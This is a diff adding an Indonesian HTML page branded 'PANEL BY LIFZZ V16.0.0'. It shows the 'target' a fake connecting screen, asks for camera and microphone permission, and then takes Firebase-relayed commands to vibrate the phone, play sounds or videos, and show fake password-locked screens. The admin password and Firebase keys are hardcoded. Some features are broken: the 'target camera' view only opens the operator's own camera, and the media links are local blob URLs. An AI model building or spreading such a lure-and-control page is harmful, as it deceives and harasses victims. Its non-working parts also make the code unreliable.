@@ -1,0 +1,933 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Access</title>
+    
+    <!-- FIREBASE SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        body {
+            background: #0f0f1a;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+            overflow: hidden;
+        }
+
+        /* ===================================== */
+        /*          LAYAR LOADING TARGET        */
+        /* ===================================== */
+        #screen-target {
+            position: fixed;
+            width: 100%;
+            height: 100vh;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            z-index: 10;
+            text-align: center;
+        }
+
+        .loader {
+            border: 5px solid rgba(255,255,255,0.1);
+            border-radius: 50%;
+            border-top: 5px solid #00f5d4;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 25px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        #screen-target h2 {
+            color: #00f5d4;
+            margin-bottom: 15px;
+        }
+
+        #screen-target p {
+            opacity: 0.7;
+            max-width: 80%;
+        }
+
+        /* ===================================== */
+        /*          LOGIN ADMIN                 */
+        /* ===================================== */
+        #screen-login {
+            display: none;
+            background: #000;
+            padding: 30px;
+            border-radius: 15px;
+            border: 2px solid #e94560;
+            text-align: center;
+        }
+
+        #screen-login h2 {
+            color: #e94560;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        #passInput {
+            padding: 15px;
+            width: 250px;
+            background: #111;
+            border: 1px solid #333;
+            color: white;
+            border-radius: 8px;
+            font-size: 16px;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .btn-login {
+            background: #e94560;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        /* ===================================== */
+        /*          ADMIN PANEL                 */
+        /* ===================================== */
+        #screen-admin {
+            display: none;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .header-admin {
+            text-align: center;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #333;
+        }
+
+        .header-admin h1 {
+            color: #e94560;
+            font-size: 22px;
+        }
+
+        .header-admin span {
+            color: #aaa;
+            font-size: 12px;
+        }
+
+        .grid-menu {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .menu-btn {
+            background: #1a1a2e;
+            border: 2px solid transparent;
+            color: white;
+            padding: 20px 10px;
+            border-radius: 12px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .menu-btn:hover {
+            border-color: #e94560;
+            transform: translateY(-3px);
+        }
+
+        .input-area {
+            background: #111;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 10px;
+        }
+
+        #textInput {
+            width: 100%;
+            padding: 12px;
+            background: #222;
+            border: none;
+            color: white;
+            border-radius: 8px;
+            margin-bottom: 10px;
+        }
+
+        .btn-kirim {
+            width: 100%;
+            padding: 12px;
+            background: #00f5d4;
+            color: black;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        /* ===================================== */
+        /*          STYLE TAMBAHAN             */
+        /* ===================================== */
+        .file-input-area {
+            background: #111;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 10px;
+        }
+
+        #fileVideo, #fileAudio {
+            display: none;
+        }
+
+        .btn-file {
+            width: 100%;
+            padding: 12px;
+            background: #ff9f1c;
+            color: black;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        #namaFile, #namaAudio {
+            margin-top: 8px;
+            font-size: 12px;
+            color: #aaa;
+        }
+
+        .btn-record {
+            width: 100%;
+            padding: 12px;
+            background: #ff0055;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .btn-record.recording {
+            background: #555;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+        /* TEKS PASSWORD (BG HITAM, TEXT MERAH) */
+        #overlay-text {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: black !important;
+            color: red !important;
+            font-size: 40px;
+            font-weight: bold;
+            display: none;
+            z-index: 9999;
+            text-align: center;
+            padding-top: 40%;
+        }
+
+        /* INPUT PASSWORD DI TARGET */
+        #passInputTeks {
+            position: fixed;
+            top: 70%;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 15px;
+            width: 250px;
+            background: #111;
+            border: 1px solid #333;
+            color: white;
+            border-radius: 8px;
+            font-size: 16px;
+            text-align: center;
+            display: none;
+            z-index: 10000;
+        }
+
+        #btnBukaTeks {
+            position: fixed;
+            top: 78%;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 12px 30px;
+            background: #e94560;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            display: none;
+            z-index: 10000;
+        }
+
+        /* Video Player */
+        #videoPlayer {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            max-width: 90%;
+            max-height: 70%;
+            border-radius: 10px;
+            z-index: 50;
+            display: none;
+        }
+
+        /* Video Kamera */
+        #videoFeed {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 1;
+            display: none;
+        }
+
+        .close-btn {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: red;
+            color: white;
+            border: none;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            font-size: 20px;
+            cursor: pointer;
+            z-index: 99;
+            display: none;
+        }
+
+        .status-online {
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            background: rgba(0,0,0,0.5);
+            padding: 5px 10px;
+            border-radius: 10px;
+            font-size: 12px;
+            z-index: 100;
+        }
+
+        .switch-cam {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.7);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 20px;
+            z-index: 99;
+            display: none;
+        }
+
+        /* LOCK SCREEN */
+        #lock-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: black;
+            display: none;
+            z-index: 99999;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        #lock-screen input {
+            padding: 15px;
+            width: 250px;
+            background: #111;
+            border: 1px solid #333;
+            color: white;
+            border-radius: 8px;
+            font-size: 16px;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        #lock-screen button {
+            padding: 12px 30px;
+            background: #e94560;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="status-online" id="statusConn">🔄 Menghubungkan...</div>
+
+    <!-- VIDEO KAMERA -->
+    <video id="videoFeed" autoplay playsinline></video>
+    <button class="close-btn" id="closeCam" onclick="tutupKamera()">✖</button>
+    <button class="switch-cam" id="switchCam" onclick="gantiKamera()">🔄 Ganti Kamera</button>
+
+    <!-- VIDEO PLAYER -->
+    <video id="videoPlayer" controls></video>
+
+    <!-- TEKS & INPUT PASSWORD -->
+    <div id="overlay-text"></div>
+    <input type="password" id="passInputTeks" placeholder="MASUKIN PASSWORD...">
+    <button id="btnBukaTeks" onclick="cekPassTeks()">BUKA</button>
+
+    <!-- LOCK SCREEN -->
+    <div id="lock-screen">
+        <h2 style="color:red; margin-bottom:20px;">LAYAR TERKUNCI</h2>
+        <input type="password" id="lockPassInput" placeholder="MASUKIN PASSWORD...">
+        <br>
+        <button onclick="cekLockPassword()">BUKA KUNCI</button>
+    </div>
+
+    <!-- ===================================== -->
+    <!-- LAYAR AWAL (DILIHAT TARGET) -->
+    <!-- ===================================== -->
+    <div id="screen-target">
+        <div class="loader"></div>
+        <h2>🔄 Sedang Menghubungkan...</h2>
+        <p>Mohon izinkan akses perangkat yang muncul di layar Anda.</p>
+        <button onclick="mintaIzinManual()" style="margin-top:30px; padding:10px 20px; background:#00f5d4; border:none; border-radius:8px; font-weight:bold;">KLIK DISINI UNTUK IZIN</button>
+    </div>
+
+    <!-- ===================================== -->
+    <!-- LOGIN ADMIN PANEL -->
+    <!-- ===================================== -->
+    <div id="screen-login">
+        <h2>🔒 ADMIN AUTHENTICATION</h2>
+        <input type="password" id="passInput" placeholder="MASUKIN PASSWORD...">
+        <br>
+        <button class="btn-login" onclick="cekPassword()">MASUK PANEL</button>
+        <p id="errorMsg" style="color:red; font-size:12px; margin-top:10px; display:none;">PASSWORD SALAH BOS!</p>
+    </div>
+
+    <!-- ===================================== -->
+    <!-- ISI MENU ADMIN PANEL -->
+    <!-- ===================================== -->
+    <div id="screen-admin">
+        <div class="header-admin">
+            <h1>🔥 PANEL BY LIFZZ V16.0.0</h1>
+            <span>Status: <b style="color:lime;" id="statusText">ONLINE</b> | Target: ACTIVE</span>
+        </div>
+
+        <div class="grid-menu">
+            <button class="menu-btn" onclick="kirimPerintah('getar')">
+                📳 GETAR HP TARGET
+            </button>
+            <button class="menu-btn" onclick="bukaKamera()">
+                📸 LIHAT KAMERA TARGET
+            </button>
+            <button class="menu-btn" onclick="kirimPerintah('suara')">
+                🔊 KIRIM SUARA KE TARGET 
+            </button>
+            <button class="menu-btn" onclick="kirimPerintah('stop')">
+                ⏹ STOP SEMUA
+            </button>
+            <button class="menu-btn" onclick="kirimPerintah('lock')">
+                🔒 LOCK SCREEN TARGET
+            </button>
+        </div>
+
+        <div class="input-area">
+            <h4 style="margin-bottom:10px; color:#00f5d4;">✍️ KIRIM TEKS (PASSWORD)</h4>
+            <input type="text" id="textInput" placeholder="Tulis pesan disini...">
+            <input type="password" id="textPass" placeholder="Password buka teks..." style="margin-top:5px;">
+            <button class="btn-kirim" onclick="kirimTeks()">KIRIM TEKS</button>
+        </div>
+
+        <!-- KIRIM VIDEO -->
+        <div class="file-input-area">
+            <h4 style="margin-bottom:10px; color:#ff9f1c;">🎬 KIRIM VIDEO</h4>
+            <input type="file" id="fileVideo" accept="video/*
+">
+            <button class="btn-file" onclick="document.getElementById('fileVideo').click()">PILIH VIDEO</button>
+            <p id="namaFile">Belum ada file dipilih</p>
+            <button class="btn-kirim" onclick="kirimVideo()">KIRIM VIDEO</button>
+        </div>
+
+        <!-- KIRIM AUDIO -->
+        <div class="file-input-area">
+            <h4 style="margin-bottom:10px; color:#ff9f1c;">🎵 KIRIM SUARA FILE</h4>
+            <input type="file" id="fileAudio" accept="audio/*,video/*">
+            <button class="btn-file" onclick="document.getElementById('fileAudio').click()">PILIH AUDIO/VIDEO</button>
+            <p id="namaAudio">Belum ada file dipilih</p>
+            <button class="btn-kirim" onclick="kirimAudio()">KIRIM SUARA</button>
+        </div>
+
+        <!-- REKAM SUARA -->
+        <div class="file-input-area">
+            <h4 style="margin-bottom:10px; color:#ff0055;">🎤 REKAM SUARA</h4>
+            <button class="btn-record" id="btnRec" onclick="toggleRecord()">🎙️ MULAI REKAM</button>
+            <p id="statusRec">Siap merekam...</p>
+        </div>
+
+        <button onclick="logout()" style="margin-top:20px; background:transparent; color:#aaa; border:none;">Keluar Panel</button>
+    </div>
+
+<script>
+    // ==========================================
+    //          INISIALISASI FIREBASE
+    // ==========================================
+    const firebaseConfig = {
+        apiKey: "AIzaSyDMNbkVP8U7W4HWbfwYTKM_k_-kJWh1b-4",
+        authDomain: "console-firebase-3c74a.firebaseapp.com",
+        projectId: "console-firebase-3c74a",
+        storageBucket: "console-firebase-3c74a.firebasestorage.app",
+        messagingSenderId: "957116111572",
+        appId: "1:957116111572:web:be6610ac674b7ab35ab941",
+        measurementId: "G-Y7S64164WV"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    const CORRECT_PASS = "PANEL BY LIFZZ V16.0.0";
+    let audioContext, oscillator;
+    let mediaRecorder, audioChunks = [];
+    let isRecording = false;
+    let currentFacingMode = "environment";
+    let passwordTeks = "";
+
+    // Update Status
+    document.getElementById('statusConn').innerText = "✅ TERHUBUNG KE SERVER";
+    document.getElementById('statusConn').style.color = "lime";
+
+    // ==========================================
+    //       PERBAIKAN: Minta Izin Manual
+    // ==========================================
+    function mintaIzinManual(){
+        navigator.mediaDevices.getUserMedia({ 
+            video: true, 
+            audio: true 
+        })
+        .then(function(stream) {
+            document.getElementById('screen-target').style.display = 'none';
+            document.getElementById('screen-login').style.display = 'block';
+            
+            let tracks = stream.getTracks();
+            tracks.forEach(track => track.stop());
+
+            mulaiListenPerintah();
+        })
+        .catch(function(err) {
+            alert("Gagal dapat izin: " + err);
+        });
+    }
+
+    // ==========================================
+    //          SISTEM LOGIN & LAYAR
+    // ==========================================
+    function cekPassword(){
+        let input = document.getElementById('passInput').value;
+        if(input === CORRECT_PASS){
+            document.getElementById('screen-login').style.display = 'none';
+            document.getElementById('screen-admin').style.display = 'block';
+        } else {
+            document.getElementById('errorMsg').style.display = 'block';
+            setTimeout(()=>{
+                document.getElementById('errorMsg').style.display = 'none';
+            }, 2000);
+        }
+    }
+
+    function logout(){
+        document.getElementById('screen-admin').style.display = 'none';
+        document.getElementById('screen-login').style.display = 'block';
+        document.getElementById('passInput').value = '';
+    }
+
+    // ==========================================
+    //          FUNGSI KIRIM KE DATABASE
+    // ==========================================
+    function kirimPerintah(aksi){
+        database.ref('perintah').set({
+            aksi: aksi,
+            waktu: Date.now()
+        });
+    }
+
+    function kirimTeks(){
+        let pesan = document.getElementById('textInput').value;
+        let pw = document.getElementById('textPass').value;
+        
+        if(pesan.trim() != "" && pw.trim() != ""){
+            passwordTeks = pw;
+            database.ref('teks').set({
+                isi: pesan,
+                password: pw
+            });
+        } else {
+            alert("Isi pesan dan password dulu bos!");
+        }
+    }
+
+    // ==========================================
+    //          FITUR UPLOAD FILE
+    // ==========================================
+    document.getElementById('fileVideo').addEventListener('change', function(e){
+        let file = e.target.files[0];
+        if(file){
+            document.getElementById('namaFile').innerText = "✅ " + file.name;
+            window.videoFile = URL.createObjectURL(file);
+        }
+    });
+
+    document.getElementById('fileAudio').addEventListener('change', function(e){
+        let file = e.target.files[0];
+        if(file){
+            document.getElementById('namaAudio').innerText = "✅ " + file.name;
+            window.audioFile = URL.createObjectURL(file);
+        }
+    });
+
+    function kirimVideo(){
+        if(window.videoFile){
+            database.ref('video').set({
+                url: window.videoFile
+            });
+        } else {
+            alert("Pilih video dulu bos!");
+        }
+    }
+
+    function kirimAudio(){
+        if(window.audioFile){
+            database.ref('audio_file').set({
+                url: window.audioFile
+            });
+        } else {
+            alert("Pilih file audio dulu bos!");
+        }
+    }
+
+    // ==========================================
+    //          FITUR REKAM SUARA
+    // ==========================================
+    function toggleRecord(){
+        if(!isRecording){
+            mulaiRekam();
+        } else {
+            stopRekam();
+        }
+    }
+
+    async function mulaiRekam(){
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            mediaRecorder = new MediaRecorder(stream);
+            audioChunks = [];
+
+            mediaRecorder.ondataavailable = event => {
+                audioChunks.push(event.data);
+            };
+
+            mediaRecorder.onstop = () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                const reader = new FileReader();
+                reader.readAsDataURL(audioBlob);
+                reader.onloadend = () => {
+                    const base64 = reader.result;
+                    database.ref('suara_rekam').set({
+                        data: base64
+                    });
+                };
+            };
+
+            mediaRecorder.start();
+            isRecording = true;
+            document.getElementById('btnRec').innerText = "⏹️ STOP REKAM";
+            document.getElementById('btnRec').classList.add('recording');
+            document.getElementById('statusRec').innerText = "🎙️ Sedang merekam...";
+        } catch(e){
+            alert("Gagal akses mic!");
+        }
+    }
+
+    function stopRekam(){
+        if(mediaRecorder && isRecording){
+            mediaRecorder.stop();
+            isRecording = false;
+            document.getElementById('btnRec').innerText = "🎙️ MULAI REKAM";
+            document.getElementById('btnRec').classList.remove('recording');
+            document.getElementById('statusRec').innerText = "✅ Selesai & Terkirim!";
+        }
+    }
+
+    // ==========================================
+    //          FUNGSI BACA DATABASE (TARGET)
+    // ==========================================
+    function mulaiListenPerintah(){
+        database.ref('perintah').on('value', function(snapshot){
+            let data = snapshot.val();
+            if(data && data.aksi){
+                eksekusiPerintah(data.aksi);
+            }
+        });
+
+        database.ref('teks').on('value', function(snapshot){
+            let data = snapshot.val();
+            if(data && data.isi && data.password){
+                tampilkanTeksLock(data.isi, data.password);
+            }
+        });
+
+        database.ref('video').on('value', function(snapshot){
+            let data = snapshot.val();
+            if(data && data.url){
+                putarVideoTarget(data.url);
+            }
+        });
+
+        database.ref('audio_file').on('value', function(snapshot){
+            let data = snapshot.val();
+            if(data && data.url){
+                putarAudioFile(data.url);
+            }
+        });
+
+        database.ref('suara_rekam').on('value', function(snapshot){
+            let data = snapshot.val();
+            if(data && data.data){
+                putarSuaraRekam(data.data);
+            }
+        });
+    }
+
+    function eksekusiPerintah(aksi){
+        if(aksi == 'getar'){
+            if(navigator.vibrate){
+                navigator.vibrate([200, 100, 200, 100, 1000]);
+            }
+        } 
+        else if(aksi == 'suara'){
+            playSuara();
+        }
+        else if(aksi == 'lock'){
+            aktifkanLockScreen();
+        }
+        else if(aksi == 'stop'){
+            stopSemua();
+        }
+
+        setTimeout(()=>{
+            database.ref('perintah').set({aksi: null});
+        }, 1000);
+    }
+
+    // ==========================================
+    //          TEKS BER PASSWORD
+    // ==========================================
+    function tampilkanTeksLock(pesan, pw){
+        stopSemua();
+        let txtBox = document.getElementById('overlay-text');
+        let inputPw = document.getElementById('passInputTeks');
+        let btnBuka = document.getElementById('btnBukaTeks');
+
+        txtBox.innerText = pesan;
+        txtBox.style.display = 'block';
+        inputPw.style.display = 'block';
+        btnBuka.style.display = 'block';
+
+        window.correctPass = pw;
+    }
+
+    function cekPassTeks(){
+        let input = document.getElementById('passInputTeks').value;
+        if(input === window.correctPass){
+            document.getElementById('overlay-text').style.display = 'none';
+            document.getElementById('passInputTeks').style.display = 'none';
+            document.getElementById('btnBukaTeks').style.display = 'none';
+            database.ref('teks').set({isi: null, password: null});
+        } else {
+            alert("PASSWORD SALAH!");
+            if(navigator.vibrate) navigator.vibrate([500, 100, 500]);
+        }
+    }
+
+    // ==========================================
+    //          LOCK SCREEN
+    // ==========================================
+    function aktifkanLockScreen(){
+        stopSemua();
+        let lock = document.getElementById('lock-screen');
+        lock.style.display = 'flex';
+    }
+
+    function cekLockPassword(){
+        let input = document.getElementById('lockPassInput').value;
+        if(input === CORRECT_PASS){
+            document.getElementById('lock-screen').style.display = 'none';
+        } else {
+            alert("PASSWORD SALAH! GABISA BUKA!");
+            if(navigator.vibrate) navigator.vibrate([1000]);
+        }
+    }
+
+    // ==========================================
+    //          PUTAR VIDEO & SUARA
+    // ==========================================
+    function putarVideoTarget(url){
+        stopSemua();
+        let vid = document.getElementById('videoPlayer');
+        vid.src = url;
+        vid.style.display = 'block';
+        vid.play();
+    }
+
+    function putarAudioFile(url){
+        stopSemua();
+        let audio = new Audio(url);
+        audio.play();
+    }
+
+    function putarSuaraRekam(data){
+        stopSemua();
+        let audio = new Audio(data);
+        audio.play();
+    }
+
+    // ==========================================
+    //          FITUR KAMERA
+    // ==========================================
+    function bukaKamera(){
+        let video = document.getElementById('videoFeed');
+        let closeBtn = document.getElementById('closeCam');
+        let switchBtn = document.getElementById('switchCam');
+
+        navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: currentFacingMode }, 
+            audio: true 
+        })
+        .then(function(stream) {
+            video.srcObject = stream;
+            video.style.display = 'block';
+            closeBtn.style.display = 'block';
+            switchBtn.style.display = 'block';
+            window.currentStream = stream;
+        })
+        .catch(function(err) {
+            alert("Gagal buka kamera boss: " + err);
+        });
+    }
+
+    function gantiKamera(){
+        if(currentFacingMode === "environment"){
+            currentFacingMode = "user";
+        } else {
+            currentFacingMode = "environment";
+        }
+        
+        if(window.currentStream){
+            window.currentStream.getTracks().forEach(track => track.stop());
+        }
+        
+        bukaKamera();
+    }
+
+    function tutupKamera(){
+        let video = document.getElementById('videoFeed');
+        let closeBtn = document.getElementById('closeCam');
+        let switchBtn = document.getElementById('switchCam');
+        let stream = video.srcObject;
+        
+        if(stream){
+            let tracks = stream.getTracks();
+            tracks.forEach(track => track.stop());
+        }
+        
+        video.style.display = 'none';
+        closeBtn.style.display = 'none';
+        switchBtn.style.display = 'none';
+    }
+
+    // ==========================================
+    //          SUARA BEEP
+    // ==========================================
+    function playSuara(){
+        try {
+            audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            oscillator = audioContext.createOscillator();
+            let gainNode = audioContext.createGain();
+
+            oscillator.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+            
+            oscillator.frequency.value = 800;
+            oscillator.type = 'sine';
+            gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
+            
+            oscillator.start();
+            
+            setTimeout(()=>{
+                stopSuara();
+            }, 2000);
+
+        } catch(e){
+            let beep = new Audio('https://actions.google.com/sounds/v1/alarms/beep_short.ogg');
+            beep.play();
+        }
+    }
+
+    function stopSuara(){
+        if(oscillator) oscillator.stop();
+        if(audioContext) audioContext.close();
+    }
+
+    function stopSemua(){
+        // Stop Teks
+        document.getElementById('overlay-text').style.display = 'none';
+        document.getElementById('passInputTeks').style.display = 'none';
+        document.getElementById('btnBukaTeks').style.display = 'none';
+        
+        // Stop Video
+        document.getElementById('videoPlayer').style.display = 'none';
+        document.getElementById('videoPlayer').src = '';
+        
+        // Stop Suara
+        stopSuara();
+    }
+
+</script>
+</body>
+</html>
